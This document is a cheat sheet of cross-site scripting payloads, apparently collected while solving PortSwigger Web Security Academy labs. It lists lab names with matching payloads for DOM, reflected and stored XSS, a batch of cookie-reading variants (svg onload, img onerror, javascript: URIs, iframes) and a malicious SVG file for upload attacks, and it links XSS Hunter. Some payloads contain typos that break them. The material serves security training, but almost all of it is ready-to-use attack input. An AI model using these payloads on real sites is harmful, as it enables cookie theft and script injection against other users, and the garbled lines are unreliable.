```
https://xsshunter.com/app
```

```css
**DOM XSS in document.write sink using source**

"><svg onload=alert(1)>

DOM XSS in innerHTML sink using source 

<img src=1 onerror=alert(1)>

DOM XSS in jQuery anchor href attribute sink using location.search source

javascript:alert(document.cookie)
storeId=</option></select><script>alert(1)</script>
Example : https://0a1b00b703f8e6d4c04d6bac00fe00ad.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)

DOM XSS in jQuery selector sink using a hashchange event

<iframe src="https://0a2300c8047be35ac091f21a00f8009b.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
Example : Above code is work on Body section of the message or response box.

Reflected XSS into attribute with angle brackets HTML-encoded

"onmouseover="alert(1)
" onfocus=alert(1) autofocus foo="
javascript:alert(1)
Example : In search box the response that we search that the random string has been reflected inside a quoted attribute like 126g37e2ue --> '126g37e2ue'.

Stored XSS into anchor href attribute with double quotes HTML-encoded

javascript:alert(1)
Example : type the payload in blogs post comment website sections.

Reflected XSS into a JavaScript string with angle brackets HTML encoded

```

```python
"><svg onload=alert(document.cookie)>

"><svg onload=alert(document.domain)>

"><img src="x" onerror="alert(document.cookie)">

"><img src=x onerror=aler(document.cookie)>

"><img src=x onerror=alert(1)>

"><img src=x onerror=prompt(document.domain)>

"><img src="x" onerror='alert(1)'>

"><svg/onload-alert(document.cookie)>

"><iframe src=javascript:prompt(document.cookie)>

tes/><iframe src-javascript:prompt(document.cookie)>

"><iframe src=javascript:prompt(1)>

"><svg onload=alert(1)>

"><img src=x onerror="alert(1)">

}}})</script><script>alert(1)</script>

<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>
```

svg file upload
```css
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert("xss");
   </script>
</svg>
```

